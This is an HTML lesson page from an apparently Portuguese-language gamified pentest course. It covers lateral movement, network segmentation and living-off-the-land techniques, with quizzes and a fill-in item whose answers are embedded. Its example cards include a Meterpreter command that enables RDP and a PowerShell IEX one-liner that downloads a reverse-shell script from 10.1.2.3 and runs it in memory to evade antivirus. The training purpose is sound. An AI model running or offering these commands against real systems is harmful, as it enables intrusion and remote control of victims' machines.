<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link rel="preconnect" href="https://cdnjs.cloudflare.com" crossorigin>
    <link rel="dns-prefetch" href="https://fonts.googleapis.com">
    <link rel="dns-prefetch" href="https://fonts.gstatic.com">
    <link rel="dns-prefetch" href="https://cdnjs.cloudflare.com">
    <title>CyberDuo - Movimento Lateral e Living off the Land</title>
    <link rel="icon" type="image/svg+xml" href="../assets/favicon.svg">
    <link rel="stylesheet" href="../assets/tailwind.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" media="print" onload="this.media='all'">
    <noscript><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"></noscript>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600&family=Inter:wght@300;400;700;800&display=swap" media="print" onload="this.media='all'">
    <noscript><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600&family=Inter:wght@300;400;700;800&display=swap"></noscript>
    <style>
        :root {
            --cyber-blue: #ff003c;
            --cyber-green: #00ff41;
            --cyber-red: #ff003c;
            --cyber-yellow: #ffb800;
            --bg-dark: #05070a;
            --card-dark: #0d1117;
        }

        html, body { height: 100%; height: 100dvh; margin: 0; padding: 0; overflow: hidden; }
        body { background-color: var(--bg-dark); color: #e6edf3; font-family: 'Inter', system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; display: flex; flex-direction: column; touch-action: manipulation; }

        .game-header { flex-shrink: 0; padding: max(0.8rem, env(safe-area-inset-top)) 1rem 0.8rem; display: flex; align-items: center; gap: 0.8rem; background: #0d1117; border-bottom: 1px solid rgba(0, 255, 65, 0.2); z-index: 60; }
        
        .close-btn {
            min-width: 48px;
            min-height: 48px;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            color: #8b949e;
            transition: all 0.15s ease;
            -webkit-tap-highlight-color: transparent;
            margin-left: -10px;
        }
        .close-btn:active {
            opacity: 0.6;
            transform: scale(0.9);
        }

        .progress-container { flex-grow: 1; height: 12px; background: #1f2937; border-radius: 10px; overflow: hidden; }
        .progress-fill { height: 100%; background: var(--cyber-blue); width: 0%; transition: width 0.4s ease; border-radius: 10px;}
        .hearts { display: flex; gap: 0.3rem; color: var(--cyber-red); min-width: 80px; justify-content: flex-end; font-size: 1.1rem; }

        .game-content { flex-grow: 1; overflow-y: auto; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: clamp(0.8rem, 3vw, 1.2rem); width: 100%; max-width: 600px; margin: 0 auto; box-sizing: border-box; scrollbar-width: none; }
        .game-content::-webkit-scrollbar { display: none; }

        .game-card { width: 100%; animation: slideUp 0.3s ease-out; display: flex; flex-direction: column; gap: 0.8rem; }
        @keyframes slideUp { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }

        /* General Typography */
        .module-subtitle { font-size: 0.7rem; font-weight: 900; color: var(--cyber-blue); text-transform: uppercase; letter-spacing: 2px; margin-bottom: 0.5rem; display: flex; align-items: center; gap: 0.5rem; }
        .title-main { font-size: clamp(1.4rem, 5vw, 1.8rem); font-weight: 800; color: white; line-height: 1.2; margin-bottom: 0.5rem; }
        .text-body { font-size: clamp(1rem, 4vw, 1.1rem); color: #b1bac4; line-height: 1.5; }
        .text-body b { color: white; }
        
        /* Utility Classes */
        .mr-1 { margin-right: 0.25rem; }
        .mr-2 { margin-right: 0.5rem; }
        .mb-1 { margin-bottom: 0.25rem; }
        .mb-2 { margin-bottom: 0.5rem; }
        .highlight-cyan { color: #00f2ff; font-weight: 700; }
        .highlight-green { color: var(--cyber-green); font-weight: 700; }

        /* TYPE: TEACH */
        .teach-card { background: #0d1117; border: 1px solid #30363d; border-radius: 1.2rem; padding: clamp(1rem, 4vw, 1.5rem); box-shadow: none; }
        .teach-icon { font-size: 2.5rem; color: var(--cyber-blue); margin-bottom: 1rem; }
        .teach-highlight { display: flex; align-items: center; gap: 0.6rem; background: rgba(0, 255, 65, 0.1); border-left: 3px solid var(--cyber-green); padding: 0.8rem; margin-top: 1rem; font-weight: 600; color: var(--cyber-green); border-radius: 0 0.5rem 0.5rem 0; }

        /* TYPE: EXAMPLE */
        .example-card { background: #0d1117; border: 1px solid #30363d; border-radius: 1.2rem; padding: clamp(1rem, 4vw, 1.5rem); box-shadow: none; }
        .example-scenario { background: #161b22; border: 1px solid #21262d; border-radius: 0.8rem; padding: 1rem; margin-top: 1rem; }
        .example-code { background: #010409; font-family: 'Fira Code', monospace; padding: 1rem; border-radius: 0.5rem; margin-top: 1rem; font-size: 0.9rem; color: #00ff41; border: 1px solid #30363d; }
        .example-takeaway { display: flex; gap: 0.8rem; align-items: flex-start; margin-top: 1rem; color: #8b949e; font-size: 0.9rem; font-weight: 600; }

        /* TYPE: QUIZ */
        .quiz-title { font-size: clamp(1.2rem, 5vw, 1.5rem); font-weight: 800; color: white; margin-bottom: 1.5rem; line-height: 1.3; }
        .options-grid { display: flex; flex-direction: column; gap: 0.6rem; width: 100%; }
        .option-card { background: #161b22; border: 2px solid #30363d; border-bottom-width: 4px; padding: clamp(0.8rem, 3vw, 1rem); border-radius: 1rem; cursor: pointer; transition: all 0.1s; display: flex; align-items: center; gap: 1rem; font-weight: 600; font-size: clamp(0.95rem, 4vw, 1.05rem); -webkit-tap-highlight-color: transparent; min-height: 48px; }
        
        .option-card:active { transform: scale(0.97); }
        .option-card.selected { border-color: var(--cyber-blue); background: rgba(0, 255, 65, 0.05); }
        .option-card.correct { border-color: var(--cyber-green) !important; background: rgba(0, 255, 65, 0.1) !important; color: var(--cyber-green); }
        .option-card.wrong { border-color: var(--cyber-red) !important; background: rgba(255, 0, 60, 0.1) !important; color: var(--cyber-red); }
        .option-card.disabled { pointer-events: none; opacity: 0.6; }
        .option-number { width: 28px; height: 28px; flex-shrink: 0; border: 2px solid #484f58; border-radius: 0.4rem; display: flex; align-items: center; justify-content: center; font-size: 0.8rem; font-weight: 800; color: #8b949e; }
        .option-card.selected .option-number { border-color: var(--cyber-blue); color: var(--cyber-blue); }

        /* TYPE: FILL */
        .fill-sentence { font-size: clamp(1.1rem, 5vw, 1.3rem); font-weight: 600; line-height: 1.6; color: white; margin-bottom: 2rem; background: #0d1117; padding: clamp(1rem, 4vw, 1.5rem); border-radius: 1.2rem; border: 1px solid #30363d; }
        .fill-slot { display: inline-block; min-width: 120px; height: 34px; border-bottom: 3px solid #484f58; margin: 0 0.5rem; vertical-align: middle; text-align: center; color: var(--cyber-blue); font-weight: 800; transition: all 0.2s; }
        .fill-slot.filled { border-bottom-color: var(--cyber-blue); }

        /* TYPE: MATCH */
        .match-container { display: grid; grid-template-columns: 1fr 1fr; gap: 0.6rem clamp(0.5rem, 3vw, 1rem); width: 100%; margin-top: 1rem; }
        .match-item { background: #161b22; border: 2px solid #30363d; border-bottom-width: 4px; padding: clamp(0.5rem, 2.5vw, 0.8rem); border-radius: 0.8rem; cursor: pointer; text-align: center; font-weight: 600; font-size: clamp(0.85rem, 3.5vw, 0.95rem); transition: all 0.1s; user-select: none; display: flex; align-items: center; justify-content: center; min-height: 60px; height: 100%; -webkit-tap-highlight-color: transparent; }
        
        .match-item:active { transform: scale(0.97); }
        .match-item.selected { border-color: var(--cyber-blue); background: rgba(0, 255, 65, 0.1); color: white; }
        .match-item.matched { border-color: var(--cyber-green); background: rgba(0, 255, 65, 0.05); color: var(--cyber-green); opacity: 0.5; pointer-events: none; }
        .match-item.error { border-color: var(--cyber-red); animation: shake 0.4s; }
        @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-5px); } 75% { transform: translateX(5px); } }

        /* FOOTER & BUTTONS */
        .game-footer { flex-shrink: 0; padding: 1rem 1rem max(1rem, env(safe-area-inset-bottom)); background: #0d1117; border-top: 1px solid #1f2937; width: 100%; display: flex; justify-content: center; box-sizing: border-box; z-index: 50; }
        .check-btn { width: 100%; max-width: 400px; padding: 1rem; border-radius: 1rem; font-weight: 800; text-transform: uppercase; cursor: pointer; background: #1f2937; color: #4b5563; border: none; font-size: 1rem; letter-spacing: 1px; transition: all 0.1s; -webkit-tap-highlight-color: transparent; }
        
        .check-btn:active { transform: scale(0.97); }
        .check-btn.active { background: var(--cyber-blue); color: black; box-shadow: 0 4px 0 #b3002a; }
        .check-btn.active:active { transform: scale(0.97) translateY(2px); box-shadow: 0 2px 0 #b3002a; }

        /* Isolated Hover Effects for fine pointer devices only */
        @media (hover: hover) and (pointer: fine) {
            .option-card:hover {
                border-color: var(--cyber-blue);
                background: rgba(0, 255, 65, 0.02);
            }
            .match-item:hover {
                border-color: var(--cyber-blue);
                background: rgba(0, 255, 65, 0.02);
            }
            .check-btn.active:hover {
                filter: brightness(1.1);
            }
            .close-btn:hover {
                color: #e6edf3;
            }
        }

        /* FEEDBACK OVERLAY */
        .feedback-overlay { position: fixed; bottom: -100%; left: 0; right: 0; padding: 1.5rem 1.5rem max(1.5rem, env(safe-area-inset-bottom)); transition: bottom 0.3s cubic-bezier(0.18, 0.89, 0.32, 1.28); z-index: 100; border-top-left-radius: 1.5rem; border-top-right-radius: 1.5rem; display: flex; flex-direction: column; align-items: center; text-align: left; }
        .feedback-overlay.show { bottom: 0; }
        .feedback-overlay.correct { background: #0d1a10; border-top: 4px solid var(--cyber-green); }
        .feedback-overlay.wrong { background: #1a0d0d; border-top: 4px solid var(--cyber-red); }
        .feedback-title { font-size: clamp(1.2rem, 5vw, 1.4rem); font-weight: 800; margin-bottom: 0.5rem; width: 100%; max-width: 400px; display: flex; align-items: center; gap: 0.5rem; }
        .feedback-msg { font-size: clamp(0.95rem, 4vw, 1.05rem); color: #8b949e; line-height: 1.5; width: 100%; max-width: 400px; margin-bottom: 1.5rem; }

        /* GAME OVER MODAL STYLES */
        .gameover-overlay {
            position: fixed;
            inset: 0;
            background: rgba(5, 7, 10, 0.95);
            backdrop-filter: blur(8px);
            -webkit-backdrop-filter: blur(8px);
            display: flex;
            align-items: center;
            justify-content: center;
            opacity: 0;
            pointer-events: none;
            transition: opacity 0.3s ease;
            z-index: 200;
            padding: 1.5rem;
        }
        .gameover-overlay.show {
            opacity: 1;
            pointer-events: auto;
        }
        .gameover-card {
            background: #0d1117;
            border: 2px solid var(--cyber-red);
            box-shadow: 0 0 30px rgba(255, 0, 60, 0.25);
            border-radius: 1.5rem;
            padding: 2.5rem 2rem;
            width: 100%;
            max-width: 450px;
            text-align: center;
            animation: gameoverScale 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275) both;
        }
        @keyframes gameoverScale {
            from { transform: scale(0.9); opacity: 0; }
            to { transform: scale(1); opacity: 1; }
        }
        .gameover-icon {
            font-size: 4.5rem;
            color: var(--cyber-red);
            margin-bottom: 1.5rem;
            text-shadow: 0 0 20px rgba(255, 0, 60, 0.4);
            animation: redPulse 2s infinite ease-in-out;
        }
        @keyframes redPulse {
            0%, 100% { transform: scale(1); opacity: 1; }
            50% { transform: scale(1.05); opacity: 0.8; }
        }
        .gameover-title {
            font-size: clamp(1.6rem, 6vw, 2rem);
            font-weight: 800;
            color: white;
            line-height: 1.2;
            margin-bottom: 1rem;
            letter-spacing: 1px;
            text-transform: uppercase;
        }
        .gameover-desc {
            font-size: clamp(0.95rem, 4vw, 1.05rem);
            color: #8b949e;
            line-height: 1.6;
            margin-bottom: 2rem;
        }
        .gameover-buttons {
            display: flex;
            flex-direction: column;
            gap: 0.8rem;
            width: 100%;
            max-width: 320px;
            margin: 0 auto;
        }
        .gameover-btn-restart {
            background: var(--cyber-red);
            color: white;
            border: none;
            box-shadow: 0 4px 0 #990024;
        }
        .gameover-btn-restart:active {
            transform: scale(0.97) translateY(2px);
            box-shadow: 0 2px 0 #990024;
        }
        .gameover-btn-menu {
            background: #161b22;
            border: 2px solid #30363d;
            color: #c9d1d9;
            box-shadow: 0 4px 0 #0d1117;
        }
        .gameover-btn-menu:active {
            transform: scale(0.97) translateY(2px);
            box-shadow: 0 2px 0 #0d1117;
        }
    </style>
</head>
<body>

    <div class="game-header">
        <div class="close-btn" onclick="window.location.href='../modules/modulo-08.html'"><i class="fas fa-times"></i></div>
        <div class="progress-container"><div class="progress-fill" id="progressFill"></div></div>
        <div class="hearts" id="heartsContainer"></div>
    </div>

    <main class="game-content" id="gameArea"></main>

    <div id="feedbackPopup" class="feedback-overlay">
        <div class="feedback-title" id="fbTitle"></div>
        <div class="feedback-msg" id="fbMsg"></div>
        <button class="check-btn active w-full" style="max-width: 400px;" onclick="handleContinue()">Continuar</button>
    </div>

    <footer class="game-footer" id="footerArea">
        <button class="check-btn" id="checkBtn" disabled onclick="checkResponse()">Verificar</button>
    </footer>

    <script>
        const steps = [
            {
                        "type": "teach",
                        "icon": "fa-arrows-left-right",
                        "title": "O que é Movimento Lateral? (Cisco 8.2.1)",
                        "content": "O <b>Movimento Lateral</b> (também chamado de <b>Pivotagem / Pivoting</b>) é o ato de usar o primeiro sistema comprometido como um trampolim para atacar outras máquinas na rede interna corporativa.<br><br>O objetivo principal é evitar a detecção, mapear o ambiente e obter acesso a <b>dados confidenciais</b>. O processo de transferir esses dados do interior para fora do perímetro da organização de forma oculta é a <b>Exfiltração de Dados</b>.",
                        "highlight": "A primeira máquina invadida raramente é o alvo final. Ela serve para pivotar até o objetivo."
            },
            {
                        "type": "teach",
                        "icon": "fa-network-wired",
                        "title": "Estratégia de Segmentação de Rede (Cisco 8.2.2)",
                        "content": "O movimento lateral só é possível se o cliente não possuir uma estratégia adequada de <b>Segmentação de Rede</b>.<br><br>🛡️ Para proteger a organização, utilizam-se firewalls internos, VLANs (redes locais virtuais) ou microsegmentação em ambientes virtualizados e containerizados. Testar a eficácia dessa segmentação de rede de forma frequente é vital no pentest.",
                        "highlight": "VLANs e firewalls internos bem configurados restringem a movimentação lateral do atacante."
            },
            {
                        "type": "example",
                        "icon": "fa-terminal",
                        "title": "Prática - Habilitando RDP via Metasploit (Cisco 8.2.2)",
                        "scenario": "Para obter controle visual do sistema Windows invadido a partir do Meterpreter, o testador utiliza o módulo de pós-exploração para ativar o serviço de RDP (Remote Desktop) e configurar permissões de firewall:",
                        "code": "meterpreter > run post/windows/manage/enable_rdp\n[*] Enabling Remote Desktop Service...\n[*] Opening RDP Port in Windows Firewall...\n[+] Service enabled successfully!",
                        "takeaway": "O RDP oferece uma interface gráfica completa criptografada, o que oculta o que você faz dos sensores de tráfego de rede."
            },
            {
                        "type": "quiz",
                        "task": "Qual é a principal desvantagem ou risco de se utilizar conexões de Área de Trabalho Remota (RDP) para se mover lateralmente durante um engajamento?",
                        "options": [
                                    "O usuário legítimo que está operando o computador remotamente pode notar de forma interativa a intrusão ou o logon de outra conta.",
                                    "As conexões RDP não oferecem interface gráfica (GUI), limitando as ações a comandos CMD brutos.",
                                    "O tráfego de rede RDP não aceita criptografia, permitindo que firewalls descobram senhas na rede facilmente."
                        ],
                        "correctText": "O usuário legítimo que está operando o computador remotamente pode notar de forma interativa a intrusão ou o logon de outra conta.",
                        "explanation": "No Windows clássico de desktop, conectar via RDP derruba a sessão do usuário ativo ou exige autorização visual dele, expondo o atacante na hora."
            },
            {
                        "type": "teach",
                        "icon": "fa-ghost",
                        "title": "Living off the Land e Malware Sem Arquivo (Cisco 8.2.3)",
                        "content": "Instalar binários maliciosos ou vírus no disco da vítima é barulhento e facilmente bloqueado pelo antivírus. Os atacantes preferem o <b>Living-off-the-Land (LOLBins)</b>.<br><br>Essa técnica (frequentemente chamada de <b>malware sem arquivo / fileless</b>) usa utilitários e comandos legítimos e nativos do próprio sistema operacional (como PowerShell, WMI, WinRM e PsExec) para executar tarefas maliciosas.",
                        "highlight": "LOLBins usam a própria 'lei' do sistema contra ele, agindo na memória sem salvar arquivos em disco!"
            },
            {
                        "type": "example",
                        "icon": "fa-terminal",
                        "title": "Prática - Execução In-Memory com PowerShell (Cisco 8.2.3)",
                        "scenario": "Para executar um script de backdoor sem baixar nenhum executável ou arquivo no HD da vítima, o atacante usa a diretiva IEX para baixar e rodar o script diretamente na memória RAM:",
                        "code": "PS > IEX (New-Object Net.WebClient).DownloadString('http://10.1.2.3/Invoke-PowerShellTcp.ps1')",
                        "takeaway": "Como o arquivo PS1 roda direto na memória RAM, a análise de disco estática do antivírus não detecta a execução."
            },
            {
                        "type": "quiz",
                        "task": "Qual é a principal característica que define a técnica de Living-off-the-Land (LOLBins) em um ataque cibernético ou simulação?",
                        "options": [
                                    "O uso exclusivo de utilitários legítimos e comandos nativos já existentes no próprio sistema alvo.",
                                    "A necessidade de formatar fisicamente o disco rígido do servidor comprometido.",
                                    "O desenvolvimento de malwares binários extremamente pesados codificados em C++."
                        ],
                        "correctText": "O uso exclusivo de utilitários legítimos e comandos nativos já existentes no próprio sistema alvo.",
                        "explanation": "LOLBins evitam alertas do antivírus porque não introduzem novos arquivos executáveis estranhos; eles usam os binários confiáveis do próprio sistema (ex: PowerShell, WMI) para rodar o ataque."
            },
            {
                        "type": "fill",
                        "sentence": "Para forçar o download e a execução de um script diretamente na memória RAM da vítima sem salvar o arquivo no HD, os invasores utilizam o cmdlet de execução de expressões com a sigla ___.",
                        "options": [
                                    "IEX",
                                    "LS",
                                    "CD"
                        ],
                        "correctText": "IEX",
                        "explanation": "IEX (Invoke-Expression) é comumente combinado com Net.WebClient.DownloadString para carregar e rodar códigos refletivamente na RAM."
            }
];

        let currentStep = 0;
        let selectedIdx = null; // For quiz and fill
        let hearts = 3;
        let shuffledOptions = [];
        
        // Match state
        let matchLeft = [];
        let matchRight = [];
        let selectedLeft = null;
        let selectedRight = null;
        let matchesFound = 0;

        function shuffle(array) {
            let currentIndex = array.length, randomIndex;
            while (currentIndex != 0) {
                randomIndex = Math.floor(Math.random() * currentIndex);
                currentIndex--;
                [array[currentIndex], array[randomIndex]] = [array[randomIndex], array[currentIndex]];
            }
            return array;
        }

        function updateProgress() {
            const progress = (currentStep / steps.length) * 100;
            document.getElementById('progressFill').style.width = `${progress}%`;
            
            const container = document.getElementById('heartsContainer');
            container.innerHTML = Array(3).fill(0).map((_, i) => `<i class="${i < hearts ? 'fas' : 'far'} fa-heart"></i>`).join('');
        }

        function render() {
            if (currentStep >= steps.length) { showVictory(); return; }
            const step = steps[currentStep];
            const area = document.getElementById('gameArea');
            const checkBtn = document.getElementById('checkBtn');
            
            updateProgress();
            
            // Reset states
            selectedIdx = null;
            checkBtn.disabled = true;
            checkBtn.classList.remove('active');
            checkBtn.innerText = (step.type === 'teach' || step.type === 'example') ? 'Continuar' : 'Verificar';
            
            if (step.type === 'teach' || step.type === 'example') {
                checkBtn.disabled = false;
                checkBtn.classList.add('active');
            }

            area.innerHTML = '';

            if (step.type === 'teach') {
                area.innerHTML = `
                    <div class="game-card teach-card">
                        <div class="module-subtitle"><i class="fas ${step.icon}"></i> NOVO CONCEITO</div>
                        <h2 class="title-main">${step.title}</h2>
                        <div class="text-body">${step.content}</div>
                        ${step.highlight ? `<div class="teach-highlight"><i class="fas fa-lightbulb mr-2"></i>${step.highlight}</div>` : ''}
                    </div>
                `;
            } 
            else if (step.type === 'example') {
                area.innerHTML = `
                    <div class="game-card example-card">
                        <div class="module-subtitle"><i class="fas ${step.icon}"></i> NA PRÁTICA</div>
                        <h2 class="title-main">${step.title}</h2>
                        <div class="example-scenario text-body">${step.scenario}</div>
                        ${step.code ? `<div class="example-code">${step.code}</div>` : ''}
                        <div class="example-takeaway"><i class="fas fa-arrow-right mt-1" style="color: var(--cyber-blue)"></i> ${step.takeaway}</div>
                    </div>
                `;
            }
            else if (step.type === 'quiz') {
                shuffledOptions = shuffle([...step.options]);
                area.innerHTML = `
                    <div class="game-card">
                        <div class="quiz-title">${step.task}</div>
                        <div class="options-grid">
                            ${shuffledOptions.map((opt, i) => `
                                <div class="option-card" onclick="selectQuiz(${i})" id="opt-${i}">
                                    <div class="option-number">${i+1}</div>
                                    <span>${opt}</span>
                                </div>
                            `).join('')}
                        </div>
                    </div>
                `;
            }
            else if (step.type === 'fill') {
                shuffledOptions = shuffle([...step.options]);
                const sentenceParts = step.sentence.split('___');
                
                area.innerHTML = `
                    <div class="game-card">
                        <div class="module-subtitle"><i class="fas fa-pen-to-square"></i> COMPLETE A FRASE</div>
                        <div class="fill-sentence">
                            ${sentenceParts[0]}<span class="fill-slot" id="fillSlot"></span>${sentenceParts[1]}
                        </div>
                        <div class="options-grid">
                            ${shuffledOptions.map((opt, i) => `
                                <div class="option-card" style="justify-content: center;" onclick="selectFill(${i})" id="opt-${i}">
                                    <span>${opt}</span>
                                </div>
                            `).join('')}
                        </div>
                    </div>
                `;
            }
            else if (step.type === 'match') {
                matchesFound = 0;
                matchLeft = shuffle(step.pairs.map((p, i) => ({text: p.term, id: i})));
                
                let isDeranged = false;
                while (!isDeranged) {
                    matchRight = shuffle(step.pairs.map((p, i) => ({text: p.definition, id: i})));
                    isDeranged = true;
                    for (let j = 0; j < matchLeft.length; j++) {
                        if (matchLeft[j].id === matchRight[j].id) {
                            if (matchLeft.length > 1) {
                                isDeranged = false;
                                break;
                            }
                        }
                    }
                }
                selectedLeft = null;
                selectedRight = null;
                
                area.innerHTML = `
                    <div class="game-card">
                        <div class="module-subtitle"><i class="fas fa-link"></i> ASSOCIE OS PARES</div>
                        <div class="quiz-title">${step.title}</div>
                        <div class="match-container">
                                ${matchLeft.map((item, i) => `
                                    <div class="match-item" id="left-${i}" onclick="selectMatch('left', ${i}, ${item.id})">${item.text}</div>
                                    <div class="match-item" id="right-${i}" onclick="selectMatch('right', ${i}, ${matchRight[i].id})">${matchRight[i].text}</div>
                                `).join('')}
                        </div>
                    </div>
                `;
            }
            
            area.scrollTop = 0;
        }

        // Interactivity Handlers
        function selectQuiz(idx) {
            selectedIdx = idx;
            document.querySelectorAll('.option-card').forEach((c, i) => c.classList.toggle('selected', i === idx));
            document.getElementById('checkBtn').disabled = false;
            document.getElementById('checkBtn').classList.add('active');
        }

        function selectFill(idx) {
            selectedIdx = idx;
            document.querySelectorAll('.option-card').forEach((c, i) => c.classList.toggle('selected', i === idx));
            const slot = document.getElementById('fillSlot');
            slot.innerText = shuffledOptions[idx];
            slot.classList.add('filled');
            document.getElementById('checkBtn').disabled = false;
            document.getElementById('checkBtn').classList.add('active');
        }

        function selectMatch(side, idx, pairId) {
            const item = document.getElementById(`${side}-${idx}`);
            if (item.classList.contains('matched')) return;

            // Clear previous selection on same side
            document.querySelectorAll(`.match-item[id^='${side}-']`).forEach(el => {
                if(!el.classList.contains('matched')) el.classList.remove('selected');
            });
            
            item.classList.add('selected');

            if (side === 'left') selectedLeft = {el: item, id: pairId};
            else selectedRight = {el: item, id: pairId};

            if (selectedLeft && selectedRight) {
                // Check match
                if (selectedLeft.id === selectedRight.id) {
                    selectedLeft.el.classList.remove('selected');
                    selectedLeft.el.classList.add('matched');
                    selectedRight.el.classList.remove('selected');
                    selectedRight.el.classList.add('matched');
                    matchesFound++;
                    
                    if (matchesFound === steps[currentStep].pairs.length) {
                        document.getElementById('checkBtn').disabled = false;
                        document.getElementById('checkBtn').classList.add('active');
                    }
                } else {
                    let errLeft = selectedLeft;
                    let errRight = selectedRight;
                    selectedLeft = null;
                    selectedRight = null;

                    errLeft.el.classList.remove('selected');
                    errLeft.el.classList.add('error');
                    errRight.el.classList.remove('selected');
                    errRight.el.classList.add('error');
                    
                    // Lose heart for wrong match
                    hearts--;
                    updateProgress();
                    if(hearts <= 0) triggerGameOver();

                    setTimeout(() => {
                        errLeft.el.classList.remove('error');
                        errRight.el.classList.remove('error');
                    }, 500);
                    return;
                }
                selectedLeft = null;
                selectedRight = null;
            }
        }

        // Logic Check
        function checkResponse() {
            const step = steps[currentStep];
            const checkBtn = document.getElementById('checkBtn');
            const popup = document.getElementById('feedbackPopup');
            
            // Non-interactive steps just advance
            if (step.type === 'teach' || step.type === 'example') {
                currentStep++;
                render();
                return;
            }

            let isCorrect = false;

            if (step.type === 'quiz' || step.type === 'fill') {
                isCorrect = shuffledOptions[selectedIdx] === step.correctText;
                
                document.querySelectorAll('.option-card').forEach((c, i) => {
                    if (shuffledOptions[i] === step.correctText) c.classList.add('correct');
                    else if (i === selectedIdx) c.classList.add('wrong');
                    c.classList.add('disabled');
                });
            } else if (step.type === 'match') {
                isCorrect = true; // Button only enables when all matches found
            }

            if (isCorrect) {
                document.getElementById('fbTitle').innerHTML = '<i class="fas fa-check-circle"></i> Excelente!';
                document.getElementById('fbTitle').className = "feedback-title text-green-500";
                document.getElementById('fbMsg').innerText = step.explanation || "Você dominou esse conceito.";
                popup.className = "feedback-overlay show correct";
            } else {
                hearts--;
                updateProgress();
                document.getElementById('fbTitle').innerHTML = '<i class="fas fa-times-circle"></i> Incorreto!';
                document.getElementById('fbTitle').className = "feedback-title text-red-500";
                document.getElementById('fbMsg').innerText = step.explanation || "O correto era: " + step.correctText;
                popup.className = "feedback-overlay show wrong";
                
                if (hearts <= 0) {
                    setTimeout(triggerGameOver, 600);
                }
            }
        }

        function triggerGameOver() {
            const modal = document.getElementById("gameoverModal");
            if (modal) {
                modal.classList.add("show");
            } else {
                alert("VOCÊ FICOU SEM VIDAS. O treinamento será reiniciado.");
                location.reload();
            }
        }

        function goToModules() {
            const closeBtn = document.querySelector(".close-btn");
            if (closeBtn) {
                const match = closeBtn.getAttribute("onclick").match(/href='([^']+)'/);
                if (match && match[1]) {
                    window.location.href = match[1];
                    return;
                }
            }
            window.location.href = "../index.html";
        }

        function handleContinue() {
            document.getElementById('feedbackPopup').classList.remove('show');
            currentStep++;
            render();
        }

        function showVictory() {
            document.getElementById('progressFill').style.width = `100%`;
            document.getElementById('footerArea').classList.add('hidden');
            
            // Salvar progresso no localStorage
            try {
                const filename = window.location.pathname.split('/').pop();
                if (filename && filename !== '0.0-boas-vindas.html') { // Ignorar o boilerplate genérico se carregado diretamente fora das lições
                    let progress = JSON.parse(localStorage.getItem('cyberduo_progress') || '{"completed_lessons":[]}');
                    if (!progress.completed_lessons) progress.completed_lessons = [];
                    if (!progress.completed_lessons.includes(filename)) {
                        progress.completed_lessons.push(filename);
                        localStorage.setItem('cyberduo_progress', JSON.stringify(progress));
                    }
                } else if (filename === '0.0-boas-vindas.html') {
                    // Forçar salvamento para a lição de boas-vindas
                    let progress = JSON.parse(localStorage.getItem('cyberduo_progress') || '{"completed_lessons":[]}');
                    if (!progress.completed_lessons) progress.completed_lessons = [];
                    if (!progress.completed_lessons.includes('0.0-boas-vindas.html')) {
                        progress.completed_lessons.push('0.0-boas-vindas.html');
                        localStorage.setItem('cyberduo_progress', JSON.stringify(progress));
                    }
                }
            } catch (e) {
                console.error("Erro ao salvar progresso no localStorage:", e);
            }
            
            let nextBtnHtml = `<button class="check-btn active w-full" onclick="window.location.href='../lessons/8.2b-powershell-sysinternals.html'" style="background: var(--cyber-green); color: black; border-color: var(--cyber-green); box-shadow: 0 4px 0 #008f20; font-size: 1.1rem; padding: 1.2rem; letter-spacing: 2px;">PRÓXIMA LIÇÃO <i class="fas fa-arrow-right ml-2"></i></button>`;
            if (nextBtnHtml.includes("##NEXT_LESSON_BTN" + "##")) {
                nextBtnHtml = `<button class="check-btn active w-full" onclick="window.location.href='../lessons/1.0-introducao.html'" style="background: var(--cyber-green); color: black; border-color: var(--cyber-green); box-shadow: 0 4px 0 #b3002a; font-size: 1.1rem; padding: 1.2rem; letter-spacing: 2px;">PRÓXIMA LIÇÃO <i class="fas fa-arrow-right ml-2"></i></button>`;
            }

            document.getElementById('gameArea').innerHTML = `
                <div class="game-card teach-card" style="align-items: center; text-align: center; border-color: var(--cyber-blue)">
                    <i class="fas fa-medal text-6xl text-yellow-400 mb-4 mt-4"></i>
                    <h2 class="title-main mb-2">Você dominou os fundamentos de pivotagem, segmentação de rede e o conceito tático de Living off the Land (LOLBins)!</h2>
                    <p class="text-body mb-6">Você completou esta lição com sucesso!</p>
                    <div style="display: flex; flex-direction: column; gap: 1rem; width: 100%; align-items: center; margin-top: 1rem;">
                        ${nextBtnHtml}
                        <div style="display: flex; gap: 1rem; width: 100%; max-width: 400px; margin-top: 0.5rem;">
                            <button class="check-btn" onclick="location.reload()" style="flex: 1; background: #161b22; border: 2px solid #30363d; color: #c9d1d9; box-shadow: 0 4px 0 #0d1117; padding: 0.8rem 0.5rem;">
                                <i class="fas fa-rotate-right mb-1 block text-lg"></i>
                                <span style="font-size: 0.75rem; display: block; margin-top: 4px;">REINICIAR</span>
                            </button>
                            <button class="check-btn" onclick="window.location.href='../modules/modulo-08.html'" style="flex: 1; background: #161b22; border: 2px solid var(--cyber-blue); color: var(--cyber-blue); box-shadow: 0 4px 0 rgba(0,255,255,0.2); padding: 0.8rem 0.5rem;">
                                <i class="fas fa-layer-group mb-1 block text-lg"></i>
                                <span style="font-size: 0.75rem; display: block; margin-top: 4px;">MÓDULOS</span>
                            </button>
                        </div>
                    </div>
                </div>
            `;
        }

        render();
    </script>

    <!-- Modal Game Over / Conexão Interrompida -->
    <div id="gameoverModal" class="gameover-overlay">
        <div class="gameover-card">
            <i class="fas fa-triangle-exclamation gameover-icon"></i>
            <h2 class="gameover-title">Conexão Interrompida</h2>
            <p class="gameover-desc">Você esgotou todas as suas tentativas. O sistema de segurança do cliente detectou a atividade e bloqueou o seu acesso.</p>
            <div class="gameover-buttons">
                <button class="check-btn gameover-btn-restart" onclick="location.reload()">
                    <i class="fas fa-rotate-right mr-2"></i> TENTAR NOVAMENTE
                </button>
